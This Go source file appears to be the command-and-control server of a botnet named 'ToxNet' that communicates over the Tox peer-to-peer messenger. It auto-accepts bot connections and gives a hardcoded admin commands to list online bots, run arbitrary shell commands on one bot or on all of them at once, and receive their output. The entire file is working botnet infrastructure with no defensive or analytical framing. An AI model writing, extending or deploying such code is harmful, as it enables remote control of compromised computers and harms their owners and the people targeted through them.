package main

import (
	"fmt"
	"io/ioutil"
	"strconv"
	"strings"
	"time"

	tox "github.com/TokTok/go-toxcore-c"
	"golang.org/x/exp/slices"
)

// Admin public keys
var admins = []string{"99C3111EC0A66672418FCFD9113DB6A1A0F5B54500461B2E8D5A6D4DF2071705"}

func showC2(toxid string, toxpub string) {

	colorReset := "\033[0m"
	colorRed := "\033[31m"
	colorYellow := "\033[33m"
	colorBlack := "\033[30m"

	fmt.Println(string(colorYellow), `
	 _____                 __       _   
	/__   \ ___ __  __  /\ \ \ ___ | |_ 
	  / /\// _ \\ \/ / /  \/ // _ \| __|
	 / /  | (_) |>  < / /\  /|  __/| |_ 
	 \/    \___//_/\_\\_\ \/  \___| \__|
	`, string(colorReset))

	fmt.Println("")
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "TOX-ID:", toxid, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "PUB-KEY:", toxpub, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("")
}

func main() {

	opt := tox.NewToxOptions()
	fname := "./server.data"
	if tox.FileExist(fname) {
		data, err := ioutil.ReadFile(fname)
		if err != nil {
			fmt.Println(err)
		} else {
			opt.Savedata_data = data
			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
		}
	}

	opt.Tcp_port = 33445
	var t *tox.Tox
	for i := 0; i < 5; i++ {
		t = tox.NewTox(opt)
		if t == nil {
			opt.Tcp_port++
		} else {
			break
		}
	}

	// Tox bootstraps (nodes.tox.chat)
	var server = []interface{}{
		"85.172.30.117", uint16(33445), "8E7D0B859922EF569298B4D261A8CCB5FEA14FB91ED412A7603A585A25698832",
	}

	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
	if err != nil {
		fmt.Println("bootstrap:", r, err, r2)
	}

	toxid := t.SelfGetAddress()
	toxpub := t.SelfGetPublicKey()

	err = t.WriteSavedata(fname)
	if err != nil {
		fmt.Println(err)
	}

	// Print C2 information
	showC2(toxid, toxpub)

	// Auto accept all incoming friend requests
	t.CallbackFriendRequest(
		func(t *tox.Tox, friendId string, message string, userData interface{}) {
			num, err := t.FriendAddNorequest(friendId)
			if err != nil {
				fmt.Println("on friend request:", num, err)
			}
			if num < 100000 {
				t.WriteSavedata(fname)
			}
		},
		nil,
	)

	// C2 receives message
	t.CallbackFriendMessage(
		func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
			// Return public key from friend number
			pub, err := t.FriendGetPublicKey(friendNumber)
			if err != nil {
				fmt.Println(err)
			}
			// Split received message
			messages := strings.Fields(message)
			// Check if sender is an admin
			if slices.Contains(admins, pub) {

				if strings.ToLower(messages[0]) == "help" {
					_, err := t.FriendSendMessage(friendNumber, `[+] HELP\n[?] LIST - List online bots.\n[?] EXEC <BOT> <CMD> - Execute command on bot.\n[?] MASS <CMD> - Mass execute command.`)
					if err != nil {
						fmt.Println(err)
					}
				} else if strings.ToLower(messages[0]) == "list" {
					// Retrieve server friends list
					fv := t.SelfGetFriendList()
					// For each friend within list
					for _, fno := range fv {
						// If friend is an admin, skip iteration
						if fno == friendNumber {
							continue
						}
						// Get connection status (ONLINE, AWAY, BUSY, OFFLINE)
						status, err := t.FriendGetConnectionStatus(fno)
						if err != nil {
							fmt.Println(err)
						}
						// If connection status isn't OFFLINE
						if status != 0 {
							// Send admin the online bot
							_, err := t.FriendSendMessage(friendNumber, "ONLINE:"+strconv.FormatUint(uint64(fno), 10))
							if err != nil {
								fmt.Println(err)
							}
						}
					}
				} else if strings.ToLower(messages[0]) == "exec" {
					// Convert string for bot to uint32
					bot, err := strconv.ParseUint(messages[1], 10, 32)
					if err != nil {
						fmt.Println(err)
					}
					// Send public key of admin with command to execute on the bot
					_, err = t.FriendSendMessage(uint32(bot), pub+" "+strings.Join(messages[2:], " "))
					if err != nil {
						fmt.Println(err)
					}

				} else if strings.ToLower(messages[0]) == "mass" {

					fv := t.SelfGetFriendList()

					for _, fno := range fv {

						if fno == friendNumber {
							continue
						}

						status, err := t.FriendGetConnectionStatus(fno)
						if err != nil {
							fmt.Println(err)
						}

						if status != 0 {
							_, err = t.FriendSendMessage(fno, pub+" "+strings.Join(messages[1:], " "))
							if err != nil {
								fmt.Println(err)
							}
						}
					}
				}
			} else { // Output from bot

				// Define public key attached to output
				relayPub := messages[len(messages)-1]
				// Define output
				relayOut := messages[:len(messages)-1]

				// Check if public key is admin
				if slices.Contains(admins, relayPub) {
					// Get friend number for admin
					admin, err := t.FriendByPublicKey(relayPub)
					if err != nil {
						fmt.Println(err)
					}
					// Send the output from bot to the admin
					_, err = t.FriendSendMessage(admin, strings.Join(relayOut, " "))
					if err != nil {
						fmt.Println(err)
					}
				}
			}
		},
		nil,
	)

	// toxcore loops
	shutdown := false
	loopc := 0
	itval := 0
	for !shutdown {
		iv := t.IterationInterval()
		if iv != itval {
			itval = iv
		}
		t.Iterate()
		loopc++
		time.Sleep(1000 * 50 * time.Microsecond)
	}
	t.Kill()
}
